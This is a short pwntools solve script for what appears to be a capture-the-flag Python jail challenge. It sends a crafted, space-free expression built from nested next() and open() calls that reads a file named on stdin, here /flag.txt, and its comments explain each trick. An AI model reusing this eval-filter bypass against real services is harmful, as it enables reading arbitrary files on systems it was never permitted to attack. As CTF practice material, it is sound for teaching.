from pwn import *
import time

HOST = "e05af123682c4b17.chal.ctf.ae"
io = remote(host=HOST, port=443, ssl=True)

# open(0)                    -> open stdin
# next(open("..."))          -> read one line from file
# next(open(next(open(0))))  -> read one line from stdin, then use it as filename to read one line from that file
# ()in()                     -> False (0)
# next(open(0)).splitlines() -> ['/flag.txt']
# next(x for x in [1])       -> 1 (get first element from an array)
# next((x)for(x)in([1]))     -> 1 (without spaces)

io.sendline(b"next(open(next((x)for(x)in(next(open(()in())).splitlines()))))")
time.sleep(1)
io.sendline(b"/flag.txt")
time.sleep(1)
print(io.recvall(timeout=10))

# flag{abc524ee57ae9783}
